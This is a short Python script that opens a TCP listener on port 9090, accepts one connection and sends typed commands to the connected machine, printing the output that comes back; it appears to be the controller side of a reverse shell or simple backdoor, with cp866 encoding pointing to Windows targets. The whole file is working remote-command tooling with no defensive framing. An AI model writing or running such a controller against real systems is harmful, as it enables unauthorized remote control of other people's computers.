import socket
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind(('0.0.0.0', 9090))
socket.listen(5)
client, addr = socket.accept()

while True:
    command = str(input('Enter command: '))
    client.send(command.encode('cp866'))
    if command.lower() == 'exit':
        break
    result_output = client.recv(1024).decode('cp866')
    print(result_output)
client.close()
socket.close()